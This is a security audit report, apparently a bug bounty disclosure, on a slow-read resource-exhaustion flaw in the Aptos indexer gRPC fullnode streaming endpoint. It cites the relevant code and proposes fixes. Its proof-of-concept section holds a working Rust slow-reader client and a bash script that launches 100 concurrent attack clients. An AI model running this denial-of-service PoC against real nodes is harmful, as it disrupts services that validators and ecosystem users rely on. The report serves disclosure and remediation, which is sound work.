# Audit Report

## Title
Slow Read Attack Allows Resource Exhaustion on Indexer gRPC Fullnode Service

## Summary

The `GetTransactionsFromNode` gRPC streaming endpoint is vulnerable to a slow read attack where malicious clients can read data slowly or stop reading entirely while keeping connections open, exhausting server resources through unbounded memory accumulation and task buildup. The implementation uses a bounded channel with blocking sends that await indefinitely when the channel fills up, with no timeout protection beyond HTTP2 keepalives that only detect dead connections, not slow readers.

## Finding Description

The vulnerability exists in the streaming implementation of the fullnode gRPC indexer service. The attack flow is as follows:

1. **Channel Creation with Small Buffer**: A bounded channel is created with a default size of only 35 messages [1](#0-0) [2](#0-1) 

2. **Spawned Task Per Connection**: Each client connection spawns a dedicated tokio task that runs indefinitely [3](#0-2) 

3. **Blocking Send Operation**: The server processes transactions and attempts to send them to the channel using `.send().await`, which blocks indefinitely when the channel is full [4](#0-3) 

4. **Insufficient Timeout Protection**: Only HTTP2 keepalive is configured (60 second interval, 5 second timeout), which only detects dead connections that don't respond to pings, not slow readers [5](#0-4) 

**Attack Execution**:
- Attacker opens multiple connections to `GetTransactionsFromNode` endpoint
- Each connection requests infinite stream (by not setting `transactions_count`) [6](#0-5) 
- Attacker reads data very slowly or stops reading after initial messages
- Server continues fetching and processing transactions from storage
- Channel fills up (only 35 messages capacity)
- Server task blocks on `.send().await`, holding processed transaction data in memory
- Multiple such connections accumulate, exhausting: tokio task limits, memory for buffered transactions, database connection pool, CPU resources for transaction processing

This breaks the **Resource Limits** invariant (#9) as operations do not respect computational and memory limits when under attack.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator Node Slowdowns**: If the indexer gRPC service is enabled on a validator node (which is supported by the configuration), resource exhaustion can degrade validator performance, potentially affecting block proposal and voting capabilities.

2. **API Crashes**: The indexer gRPC API service can experience severe degradation or crashes due to:
   - Memory exhaustion from accumulated transaction data
   - Task scheduler exhaustion from hundreds/thousands of blocked tasks
   - Database connection pool exhaustion
   - CPU starvation from continuous transaction processing

3. **Service Availability**: Critical data availability infrastructure for indexers and ecosystem applications becomes unavailable, affecting the broader Aptos ecosystem.

The attack requires no privileges, is trivial to execute with standard gRPC clients, and can be multiplied across many connections for amplified impact.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Zero Privileges Required**: Any network client can connect to the publicly exposed gRPC endpoint (default port 50051)
2. **Trivial Exploitation**: Requires only a standard gRPC client library and a simple script to connect and read slowly
3. **No Rate Limiting**: No apparent connection rate limiting or per-client resource quotas
4. **Amplification Factor**: A single attacker can open hundreds of concurrent connections from multiple IPs
5. **No Detection**: Slow reads appear as legitimate clients with poor network connectivity
6. **Persistent Effect**: Each connection holds resources indefinitely (no timeout beyond keepalive for dead connections)

## Recommendation

Implement multiple layers of protection against slow read attacks:

**1. Add Send Timeout with Error Handling**:
```rust
// In stream_coordinator.rs, replace blocking send with timeout
use tokio::time::timeout;

const SEND_TIMEOUT: Duration = Duration::from_secs(30);

for response in responses {
    match timeout(SEND_TIMEOUT, self.transactions_sender.send(Ok(response))).await {
        Ok(Ok(_)) => {
            // Successful send
        },
        Ok(Err(_)) => {
            // Channel closed, client disconnected
            return vec![];
        },
        Err(_) => {
            // Timeout - client is reading too slowly
            error!("Client reading too slowly, terminating stream");
            return vec![];
        }
    }
}
```

**2. Increase Channel Buffer Size with Configuration**:
```rust
// In indexer_grpc_config.rs
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 1000; // Increased from 35
```

**3. Add Connection-Level Limits**:
```rust
// In runtime.rs, add concurrency limits
use tower::limit::ConcurrencyLimit;

let service_with_limits = ConcurrencyLimit::new(
    tonic_server.add_service(svc),
    100 // Max concurrent streams per server
);
```

**4. Implement Per-Client Rate Limiting**:
Track client IPs and enforce maximum concurrent connections per IP using middleware.

**5. Add Stream-Level Timeout**:
```rust
// In runtime.rs
let tonic_server = Server::builder()
    .timeout(Duration::from_secs(300)) // Overall stream timeout
    .http2_keepalive_interval(Some(Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(Duration::from_secs(5)))
```

## Proof of Concept

```rust
// PoC: Slow read attack client
// File: slow_read_attack_poc.rs

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::time::{sleep, Duration};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the fullnode gRPC service
    let mut client = FullnodeDataClient::connect("http://127.0.0.1:50051").await?;
    
    // Request infinite stream starting from version 0
    let request = Request::new(GetTransactionsFromNodeRequest {
        starting_version: Some(0),
        transactions_count: None, // Infinite stream
    });
    
    let mut stream = client.get_transactions_from_node(request).await?.into_inner();
    
    println!("[*] Connected to gRPC stream");
    
    // Read only a few messages, then slow down drastically
    for i in 0..5 {
        if let Some(_response) = stream.message().await? {
            println!("[*] Received message {}", i);
        }
    }
    
    println!("[*] Now reading VERY slowly (1 message per 60 seconds)");
    
    // Read extremely slowly - 1 message per minute
    // Server will keep processing and filling the channel
    loop {
        sleep(Duration::from_secs(60)).await;
        if let Some(_response) = stream.message().await? {
            println!("[*] Read one message after 60s delay");
        }
    }
}
```

**Attack Script to Exhaust Resources**:
```bash
#!/bin/bash
# Launch 100 concurrent slow readers
for i in {1..100}; do
    cargo run --bin slow_read_attack_poc &
    echo "Started attack client $i"
    sleep 0.1
done

echo "Attack launched with 100 slow readers"
echo "Monitor server with: htop, netstat -an | grep 50051 | wc -l"
```

**Observable Impact**:
- Memory usage continuously increases on server
- Number of tokio tasks increases (visible in metrics)
- Server becomes unresponsive to new legitimate clients
- Database connection pool may be exhausted
- CPU usage remains high due to continuous transaction processing

## Notes

This vulnerability specifically affects the indexer gRPC fullnode service, which is an optional component primarily used for serving blockchain data to indexers and ecosystem applications. While it doesn't directly affect consensus validators in typical deployments, the configuration allows enabling this service on any node type, including validators. The risk is significantly amplified if operators enable the indexer service on production validator nodes, as resource exhaustion could degrade their consensus participation.

The root cause is the combination of: (1) unbounded blocking on channel sends, (2) small default channel buffer, (3) lack of send-level timeouts, and (4) client-controlled read rate with no server-side enforcement. The HTTP2 keepalive mechanism only detects completely dead connections, not slow or stalled readers that still respond to pings.

### Citations

**File:** config/src/config/indexer_grpc_config.rs (L19-19)
```rust
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 35;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L94-94)
```rust
        let (tx, rx) = mpsc::channel(transaction_channel_size);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-101)
```rust
        tokio::spawn(async move {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L221-226)
```rust
        for response in responses {
            if self.transactions_sender.send(Ok(response)).await.is_err() {
                // Error from closed channel. This means the client has disconnected.
                return vec![];
            }
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L102-103)
```rust
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L73-75)
```rust
    /// If not set, response streams infinitely.
    #[prost(uint64, optional, tag="2")]
    pub transactions_count: ::core::option::Option<u64>,
```
